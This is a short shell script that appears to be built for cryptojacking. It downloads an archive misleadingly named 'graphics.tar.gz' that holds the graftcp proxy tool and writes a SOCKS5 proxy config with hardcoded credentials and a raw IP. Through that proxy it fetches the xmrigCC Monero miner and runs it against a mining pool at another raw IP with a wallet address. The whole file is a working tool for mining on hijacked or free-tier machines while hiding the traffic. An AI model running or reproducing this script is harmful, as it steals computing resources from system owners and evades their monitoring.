#apt-get update -y
wget https://github.com/Melpinoy/Gg/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 45.88.24.139:443

socks5_username = temera88

socks5_password = temera88

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "


./graftcp/graftcp wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz && tar -xvf xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz && cd miner && ./xmrigDaemon -o 45.88.24.197:443 -u TX1QCQE3qH5AJWtAyhiZqT3WuwaS3opK6K -p x -a rx/0 -t 4
